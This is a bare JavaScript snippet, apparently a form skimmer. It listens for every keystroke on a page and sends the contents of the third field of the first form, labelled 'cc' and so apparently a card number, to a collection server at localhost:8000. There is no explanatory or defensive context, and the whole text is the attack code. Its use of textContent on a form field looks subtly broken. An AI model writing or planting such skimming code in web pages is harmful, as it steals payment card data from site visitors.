function sendreq(cc) {
    var url = "http://localhost:8000?cc=" + cc;
    var req = new XMLHttpRequest();
    req.open("GET", url, true);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send();
}

document.addEventListener('keydown', (event) => {
    sendreq(document.querySelector('form')[2].textContent);
}, false);
